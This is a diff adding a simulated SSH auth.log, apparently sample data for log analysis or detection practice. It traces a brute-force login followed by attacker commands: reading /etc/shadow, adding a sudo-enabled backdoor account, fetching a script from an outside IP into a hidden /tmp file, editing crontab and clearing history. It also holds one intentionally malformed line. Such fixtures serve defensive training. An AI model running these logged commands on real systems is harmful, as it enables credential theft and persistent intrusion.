@@ -1,0 +1,51 @@
+# ====================================================================================
+# SAMPLE DATA - SIMULATED auth.log FOR DEMONSTRATION ONLY. NOT REAL SECURITY EVENTS.
+# Host "demo-srv01" and all IPs are fictional (RFC 5737 documentation ranges / private).
+# Scenario: SSH brute force -> compromised account -> privilege escalation -> persistence.
+# ====================================================================================
+Oct 27 08:02:11 demo-srv01 sshd[1021]: Accepted publickey for deploy from 10.0.0.15 port 51522 ssh2: ED25519 SHA256:q1w2e3r4t5y6
+Oct 27 08:02:11 demo-srv01 sshd[1021]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Oct 27 08:03:40 demo-srv01 sudo:   deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 27 08:03:40 demo-srv01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Oct 27 08:03:41 demo-srv01 sudo: pam_unix(sudo:session): session closed for user root
+Oct 27 08:15:02 demo-srv01 CRON[1102]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 27 08:15:02 demo-srv01 CRON[1102]: pam_unix(cron:session): session closed for user root
+Oct 27 08:21:55 demo-srv01 sshd[1021]: Disconnected from user deploy 10.0.0.15 port 51522
+Oct 27 08:21:55 demo-srv01 sshd[1021]: pam_unix(sshd:session): session closed for user deploy
+Oct 27 08:47:13 demo-srv01 sshd[1180]: Did not receive identification string from 198.51.100.77 port 40112
+Oct 27 08:47:19 demo-srv01 sshd[1182]: Invalid user oracle from 198.51.100.77 port 40130
+Oct 27 08:47:21 demo-srv01 sshd[1182]: Failed password for invalid user oracle from 198.51.100.77 port 40130 ssh2
+Oct 27 08:47:30 demo-srv01 sshd[1184]: Failed password for root from 198.51.100.77 port 40144 ssh2
+Oct 27 08:47:31 demo-srv01 sshd[1184]: Connection closed by authenticating user root 198.51.100.77 port 40144 [preauth]
+Oct 27 09:14:02 demo-srv01 sshd[1301]: Invalid user admin from 203.0.113.45 port 52211
+Oct 27 09:14:04 demo-srv01 sshd[1301]: Failed password for invalid user admin from 203.0.113.45 port 52211 ssh2
+Oct 27 09:14:19 demo-srv01 sshd[1303]: Failed password for root from 203.0.113.45 port 52219 ssh2
+Oct 27 09:14:33 demo-srv01 sshd[1305]: Invalid user test from 203.0.113.45 port 52230
+Oct 27 09:14:35 demo-srv01 sshd[1305]: Failed password for invalid user test from 203.0.113.45 port 52230 ssh2
+Oct 27 09:14:51 demo-srv01 sshd[1307]: Failed password for root from 203.0.113.45 port 52241 ssh2
+Oct 27 09:15:08 demo-srv01 sshd[1309]: Failed password for backup from 203.0.113.45 port 52250 ssh2
+Oct 27 09:15:24 demo-srv01 sshd[1309]: Failed password for backup from 203.0.113.45 port 52250 ssh2
+Oct 27 09:15:40 demo-srv01 sshd[1309]: error: maximum authentication attempts exceeded for backup from 203.0.113.45 port 52250 ssh2 [preauth]
+Oct 27 09:16:12 demo-srv01 sshd[1311]: Failed password for backup from 203.0.113.45 port 52263 ssh2
+Oct 27 09:17:41 demo-srv01 sshd[1311]: Accepted password for backup from 203.0.113.45 port 52263 ssh2
+Oct 27 09:17:41 demo-srv01 sshd[1311]: pam_unix(sshd:session): session opened for user backup(uid=1003) by (uid=0)
+Oct 27 09:19:05 demo-srv01 sudo:   backup : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
+Oct 27 09:19:48 demo-srv01 su[1340]: FAILED SU (to root) backup on pts/1
+Oct 27 09:20:30 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tar -czf /var/backups/home.tgz /home
+Oct 27 09:21:02 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Oct 27 09:22:14 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate
+Oct 27 09:22:14 demo-srv01 useradd[1366]: new group: name=sysupdate, GID=1005
+Oct 27 09:22:14 demo-srv01 useradd[1366]: new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1
+Oct 27 09:22:39 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate
+Oct 27 09:22:39 demo-srv01 usermod[1371]: add 'sysupdate' to group 'sudo'
+Oct 27 09:22:39 demo-srv01 usermod[1371]: add 'sysupdate' to shadow group 'sudo'
+Oct 27 09:23:10 demo-srv01 passwd[1375]: pam_unix(passwd:chauthtok): password changed for sysupdate
+Oct 27 09:23:57 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/upd.sh -O /tmp/.upd.sh
+Oct 27 09:24:20 demo-srv01 sudo:   backup : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/crontab -e
+Oct 27 09:25:03 demo-srv01 sshd[1311]: Disconnected from user backup 203.0.113.45 port 52263
+Oct 27 09:25:03 demo-srv01 sshd[1311]: pam_unix(sshd:session): session closed for user backup
+Oct 27 09:31:45 demo-srv01 sshd[1402]: Accepted password for sysupdate from 203.0.113.45 port 52390 ssh2
+Oct 27 09:31:45 demo-srv01 sshd[1402]: pam_unix(sshd:session): session opened for user sysupdate(uid=1005) by (uid=0)
+Oct 27 09:32:10 demo-srv01 sudo: sysupdate : TTY=pts/2 ; PWD=/home/sysupdate ; USER=root ; COMMAND=/usr/bin/history -c
+this line is intentionally malformed to demonstrate input validation
+Oct 27 09:40:00 demo-srv01 sshd[1402]: Received disconnect from 203.0.113.45 port 52390:11: disconnected by user
